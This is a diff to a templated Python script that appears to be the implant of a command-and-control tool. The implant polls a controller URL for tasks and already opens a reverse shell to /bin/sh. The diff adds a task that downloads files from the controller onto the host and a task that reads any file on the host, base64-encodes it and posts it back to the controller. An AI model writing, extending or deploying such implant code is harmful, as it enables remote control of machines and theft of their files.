@@ -1,6 +1,7 @@
 import multiprocessing
 import os
 import socket
+import base64
 import subprocess as sp
 import time
 
@@ -15,6 +16,12 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 URL = "http://{{address}}:{{port}}/"
 {% endif %}
 
+
+def download_file(file_name: str, file_path: str):
+    with open(file_path, "wb") as f:
+        f.write(r.get(URL+"download/"+file_name, verify=False).content)
+
+
 def reverse_shell(address: str, port: int):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((address, int(port)))
@@ -25,6 +32,7 @@ def reverse_shell(address: str, port: int):
     os.dup2(s.fileno(), 1)
     os.dup2(s.fileno(), 2)
     sp.call(["/bin/sh", "-i"])
+
 
 data = {
     "address": socket.gethostbyname(socket.gethostname()),
@@ -40,7 +48,7 @@ for _ in range({{timeout}}):
         continue
     tasks = tasks.json()
     for task in tasks:
-        if task["type"] in ["rce", "dir", "reverse-shell"]:
+        if task["type"] in ["rce", "dir", "reverse-shell", "download", "upload"]:
             data = {
                 "id": task["id"],
                 "success": True
@@ -53,4 +61,20 @@ for _ in range({{timeout}}):
                 multiprocessing.Process(target=reverse_shell, args=(
                     task["args"]["address"], task["args"]["port"])).start()
                 data["output"] = "Send reverse shell"
+            elif task["type"] == "upload":
+                try:
+                    download_file(task["args"]["file_name"], task["args"]["target_path"])
+                except Exception as e:
+                    data["success"] = False
+                    data["output"] = str(e)
+                else:
+                    data["output"] = "Downloaded file"
+            elif task["type"] == "download":
+                try:
+                    with open(task["args"]["target_path"], "rb") as f:
+                        data["output"] = base64.b64encode(f.read()).decode()
+                except Exception as e:
+                    data["success"] = False
+                    data["output"] = str(e)
+
             res = r.post(URL + "/finish/" + name, json=data, verify=False)
